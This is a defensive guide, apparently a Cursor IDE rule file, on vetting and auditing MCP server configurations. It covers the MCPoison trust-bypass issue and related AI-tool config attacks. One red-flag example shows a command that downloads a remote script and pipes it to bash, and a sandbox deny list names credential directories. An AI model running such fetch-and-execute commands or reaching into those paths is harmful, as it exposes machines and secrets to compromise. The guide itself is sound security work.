---
description: >
  Governs the safe use of Model Context Protocol (MCP) servers and configurations
  in Cursor IDE. Covers vetting, approval, re-verification, and the MCPoison
  trust-bypass attack (CVE-2025-54136). Critical for teams sharing codebases or
  using Cursor in production workflows.
  Use when: (1) adding an MCP server to a project, (2) reviewing a repo that contains
  .cursor/mcp.json, (3) pulling from a shared repository, (4) onboarding a new
  team member, (5) auditing existing MCP configurations.
globs: ["**/.cursor/mcp.json", "**/.cursor/*.json", "**/cursor.json"]
alwaysApply: false
---

# MCP Security

## Purpose

Model Context Protocol (MCP) servers extend Cursor with powerful capabilities — database access, API integrations, file system tools, web browsing. That power is also a serious attack surface. This skill ensures MCP configurations are vetted, tracked, and periodically re-verified.

## Why This Matters: CVE-2025-54136 (MCPoison)

In August 2025, Check Point Research disclosed a critical vulnerability in Cursor's MCP system dubbed **MCPoison**. The attack works like this:

1. An attacker adds a harmless-looking MCP config to a shared repository
2. A developer pulls the code and approves the MCP in Cursor (one-time prompt)
3. **The attacker then silently modifies the MCP configuration to become malicious**
4. Cursor never re-checks an already-approved MCP — so the malicious version runs without any warning, every time the project is opened

**For non-technical founders and teachers:** This means an MCP config in a codebase is like a browser extension that can update itself after you've approved it. If someone else has write access to a repo you work in, they can gain silent, persistent access to your machine — including credentials, SSH keys, and any secrets visible to Cursor.

**Current mitigation:** Update Cursor to the latest version. Cursor patched this in a subsequent release. However, the underlying trust model risk remains for any MCP-heavy workflow — the practices below are still required.

## Activation

This skill activates when you mention:
- "MCP", "Model Context Protocol", "mcp.json"
- "Cursor plugin", "Cursor extension", "MCP server"
- "tool call", "agent tool", "MCP configuration"
- "shared repository", "team project", "clone repo"

Also activates when:
- Opening a project that contains `.cursor/mcp.json`
- Reviewing a PR that modifies any `.cursor/` configuration
- Adding a new MCP server via `/add-plugin` or manual config

## MCP Threat Model

### Attack Vectors

| Vector | Risk | Who's Most Exposed |
|--------|------|-------------------|
| **Malicious MCP in shared repo** | RCE after single approval | Teams, open-source contributors |
| **Supply chain via Cursor Marketplace** | Malicious plugin posing as legitimate | Anyone installing marketplace plugins |
| **Overpermissive MCP** | Excessive access beyond stated purpose | Solo developers, small teams |
| **MCP with hardcoded credentials** | Credential theft | Anyone who clones and opens the project |
| **Prompt injection via MCP tool output** | Agent manipulated by malicious data | Projects using MCP to fetch external data |

### What MCPs Can Access

Before approving any MCP, understand what it can reach:

```
MCP capabilities (depending on what the server implements):
├── Filesystem read/write (your entire machine if not sandboxed)
├── Terminal command execution
├── Network requests (APIs, databases, internal services)
├── Environment variables (including secrets Cursor can see)
├── Browser automation
└── Code execution
```

An MCP is code running on your machine with your privileges. Treat it like installing software.

### Related: AI Tool Project Config Files as Attack Surface (CVE-2025-59536 / CVE-2026-21852)

In March 2026, Check Point Research disclosed a critical vulnerability in Anthropic's Claude Code exploiting the same trust model as MCPoison — but targeting `.claude/settings.json` project files instead of `.cursor/mcp.json`. The **Hooks** feature allowed attackers to embed shell commands in a project's config file; any developer who cloned and opened the repo had arbitrary commands execute on their machine, and Anthropic API keys were silently exfiltrated.

**The pattern is identical to MCPoison:** a config file in the repository is trusted implicitly, and a contributor with repo write access can weaponise it.

**Lesson for Cursor teams:** Any AI tool configuration file that lives in a repository is a potential RCE vector. This includes:

| File | Tool | Risk |
|------|------|------|
| `.cursor/mcp.json` | Cursor | MCPoison (CVE-2025-54136) |
| `.claude/settings.json` | Claude Code | Hooks RCE (CVE-2025-59536) |
| `.cursor/automations/` | Cursor Automations | Automation config injection |

**Mitigations:**
- Review any `.claude/`, `.cursor/`, or similar AI tool config directories when cloning unfamiliar repos — treat them like `.github/workflows/`
- Limit write access to these directories in shared repositories
- Block direct pushes to these config paths in branch protection rules where possible
- Update all AI development tools regularly — both CVEs above were patched in subsequent releases

## Vetting MCPs Before Approval

### Questions to Ask Before Approving Any MCP

```markdown
## MCP Approval Checklist: [MCP Name]

**Source**
- [ ] Where did this MCP come from? (official Cursor Marketplace / team-built / third-party repo)
- [ ] Is the source repository public and auditable?
- [ ] Who maintains it? Is it actively maintained?
- [ ] How many users/stars does it have? (for third-party MCPs)

**Permissions**
- [ ] What tools does this MCP expose? (read the mcp.json carefully)
- [ ] Does it need filesystem access? If so, which directories?
- [ ] Does it make network requests? To where?
- [ ] Does it need environment variables/credentials?

**Necessity**
- [ ] Do I actually need this MCP for the task at hand?
- [ ] Is there a less privileged alternative?
- [ ] Could I use Cursor's built-in tools instead?

**Risk**
- [ ] Has this MCP been reviewed by someone technical on the team?
- [ ] Is it version-pinned? (prevents silent updates)
- [ ] Is it in the approved MCP list for this project?
```

### Reading an MCP Configuration

```json
// .cursor/mcp.json - What to look for when reviewing
{
  "mcpServers": {
    "example-server": {
      "command": "npx",
      "args": [
        // ⚠️ REVIEW: Is this a specific pinned version or latest?
        "-y",
        "@company/mcp-server@1.2.3",  // ✅ Pinned = safer
        // "@company/mcp-server"       // ❌ Unpinned = can change silently
      ],
      "env": {
        // ⚠️ REVIEW: What environment variables does this need?
        // Never approve MCPs that ask for more secrets than they need
        "API_KEY": "${COMPANY_API_KEY}"  // ✅ Reads from env, not hardcoded
        // "API_KEY": "sk_live_abc123"  // ❌ NEVER - hardcoded credential
      }
    }
  }
}
```

### Red Flags in MCP Configurations

```json
// 🚨 RED FLAGS - Do not approve without investigation

// Unpinned versions (can update silently to malicious code)
"args": ["-y", "@package/mcp-server"]

// Hardcoded credentials
"env": { "API_KEY": "sk_live_actualkey123" }

// Execution from URLs (can be changed to point to malicious code)
"command": "curl https://example.com/mcp-server.sh | bash"

// Excessive filesystem permissions
"args": ["--allow-read=/", "--allow-write=/"]

// Requests to unusual URLs during what should be local operations
// (look for network calls in the server source code)
```

## Team Governance for MCPs

### Approved MCP Registry

Maintain a team-approved list. Any MCP not on this list requires review before the project can be used:

```yaml
# .cursor/approved-mcps.yaml
# Last reviewed: 2026-03-01
# Reviewer: [name]

approved:
  - name: linear
    version: "@linear/mcp-server@0.3.2"
    purpose: "Create and update Linear issues"
    approved_by: "Jason"
    approved_date: "2026-02-10"
    review_due: "2026-05-10"
    
  - name: stripe
    version: "@stripe/agent-toolkit@0.1.0"
    purpose: "Query Stripe products and prices"
    approved_by: "Jason"
    approved_date: "2026-02-15"
    review_due: "2026-05-15"
    notes: "Read-only. No charge creation."

blocked:
  - name: "example-malicious-mcp"
    reason: "Found attempting to exfiltrate env vars"
    blocked_date: "2026-02-20"
```

### Version Pinning (Required)

```bash
# ❌ Never use unpinned MCPs in a shared project
"args": ["-y", "@package/mcp-server"]

# ✅ Always pin to a specific version
"args": ["-y", "@package/mcp-server@1.2.3"]

# Verify the pinned version hasn't changed
npm view @package/mcp-server@1.2.3 integrity
```

### PR Review Rule for MCP Changes

Add this to your team's PR review checklist:

```markdown
## If this PR modifies .cursor/ files:

- [ ] Was a new MCP added or modified?
- [ ] If yes: Has it been added to approved-mcps.yaml?
- [ ] Has someone reviewed the MCP source code or changelog for this version?
- [ ] Are all versions pinned?
- [ ] Does the change include any hardcoded credentials?
- [ ] Has this been reviewed by at least one person who didn't write it?

MCP changes in PRs require review — this is equivalent to adding a new npm package
with shell execution capabilities.
```

## Sandbox Network Controls (Feb 2026)

Cursor's sandbox now supports restricting what MCP servers can reach. Use this to limit blast radius:

```json
// .cursor/sandbox.json
{
  "network": {
    "mode": "allowlist",
    "allow": [
      "api.linear.app",
      "api.stripe.com",
      "registry.npmjs.org"
    ]
  },
  "filesystem": {
    "deny": [
      "~/.ssh",
      "~/.aws",
      "~/.config/gcloud",
      "secrets/"
    ]
  }
}
```

**Note:** Enterprise plan admins can enforce sandbox policies org-wide from the Cursor admin dashboard. If you're using Cursor Teams, ask your admin to lock down filesystem and network access.

## Cursor Marketplace Plugin Governance (Feb 2026, expanded March 2026)

Cursor's [Marketplace](https://cursor.com/marketplace) packages MCPs, hooks, skills, and subagents into installable plugins. The initial Feb 2026 launch included Amplitude, AWS, Figma, Linear, Stripe. **In March 2026, 30+ new plugins were added** from partners including Atlassian, Datadog, GitLab, Glean, Hugging Face, monday.com, and PlanetScale — significantly expanding the attack surface.

### Risk Profile of March 2026 Partner Plugins

The new partner set introduces higher-risk capability categories:

| Partner | What It Can Access | Why Higher Risk |
|---------|-------------------|-----------------|
| **GitLab** | Repositories, branches, CI pipelines | Can push code, trigger pipelines, read all repos you have access to |
| **Datadog** | Logs, metrics, traces, alerts | Production log data may contain secrets, PII, or internal infra details |
| **PlanetScale** | Database branches, schema, queries | Production database access; schema changes via agent are dangerous |
| **Atlassian** | Jira issues, Confluence docs, Bitbucket | Cross-tool access; issues/docs often contain sensitive internal info |
| **monday.com** | Boards, items, automations, files | Project data, potentially including personal info and credentials in items |
| **Hugging Face** | Model repos, datasets, inference endpoints | Can push model weights; fine-tuning jobs can be expensive |
| **Glean** | Enterprise search across all connected apps | Broad read access to your entire company knowledge base |

**For non-technical founders:** The Feb 2026 launch partners (Stripe, Linear, Figma) were mostly read-heavy. The March 2026 partners include write access to production databases, code repos, and CI/CD pipelines. The stakes are higher — treat these plugins like giving the AI a key to your production systems, not just a read-only window.

Before installing any marketplace plugin:

1. **Verify the publisher** — Is this the official company (Stripe, AWS) or a third-party clone?
2. **Read the permissions** — Check what the plugin's MCP server can access
3. **Install to test environment first** — Never install directly to a production project
4. **Pin the version** — Install at a specific version, not "latest"
5. **Treat like a code dependency** — It requires the same review as adding an npm package
6. **For write-capable plugins** (GitLab, PlanetScale, Atlassian): Get explicit sign-off from a technical reviewer before enabling in any environment with production data

```bash
# Install a specific plugin version (if supported)
/add-plugin @stripe/cursor-plugin@1.0.0

# Not
/add-plugin @stripe/cursor-plugin  # installs latest - can change
```

### Team Marketplaces (Feb 2026)

Enterprise and Teams plan admins can create **private team marketplaces** to distribute approved plugins internally. This is the recommended governance approach:

1. Admin vets and approves a plugin at a specific version
2. Plugin is published to the team marketplace
3. Team members install from the team marketplace (vetted, version-locked)
4. Admin controls which plugins are available to the team

This centralises the approval process and prevents individuals from installing unvetted plugins directly from the public marketplace. If you're on a Teams plan, configure a team marketplace before enabling marketplace plugins.

## Periodic Re-Verification

Because of the MCPoison attack pattern, MCP configurations must be verified periodically — not just at initial approval.

### Quarterly MCP Audit

```markdown
## MCP Quarterly Audit: [Date]
**Auditor:** [name]

For each entry in approved-mcps.yaml:

1. Run `git log .cursor/mcp.json` to see if MCP config changed since last audit
2. Check the package version: `npm view @package/mcp-server versions`
3. Verify the pinned version is still current and not deprecated
4. Check if security advisories exist for this package
5. Confirm the MCP is still needed (remove unused MCPs)

### Findings
| MCP | Status | Action Required |
|-----|--------|-----------------|
| linear | ✅ No changes | None |
| stripe | ⚠️ New version available | Review changelog, update if safe |
```

### Detect MCP Config Changes

```bash
# Check for recent changes to MCP configs in a repo
git log --all --oneline -- '**/.cursor/mcp.json'

# See what changed
git diff HEAD~5 -- .cursor/mcp.json

# Verify the file hasn't changed since you last approved it
md5sum .cursor/mcp.json > .cursor/mcp.json.checksum
# On next open:
md5sum -c .cursor/mcp.json.checksum
```

## If You Suspect an MCP Has Been Compromised

```markdown
## Incident Response: Suspected Malicious MCP

IMMEDIATE ACTIONS (within 15 minutes):
1. Close Cursor immediately
2. Disconnect from the internet
3. Rotate any credentials that Cursor had access to (check your .env files)
4. Rotate SSH keys if ~/.ssh was not sandboxed
5. Audit recent Cursor actions in logs

INVESTIGATION:
1. git log .cursor/mcp.json -- what changed and when?
2. Check for unexpected processes: ps aux | grep node
3. Look for new files in temp directories
4. Check network logs for unexpected outbound connections

REMEDIATION:
1. Remove the compromised MCP from mcp.json
2. Report to your team immediately
3. File a security incident report
4. Check if the malicious MCP was committed to your repo (could affect others)
```

## Integration

### With Security Gate
- MCP configuration changes trigger security review
- Unpinned MCP versions block deployment
- Any .cursor/ changes flag for human review

### With Human Approval
- New MCPs always require human approval
- MCP version bumps in shared repos require review
- Marketplace plugin installs require sign-off

### With Secrets Management
- MCPs should never receive hardcoded credentials
- Environment variables used for MCP secrets follow same rotation rules
- MCP access to secrets/ directory must be explicitly sandboxed out

### With Dependency Scanning
- MCP npm packages should be audited with `npm audit`
- MCPs from Cursor Marketplace should be treated as third-party dependencies
- Supply chain risk applies: verify publisher identity before installing
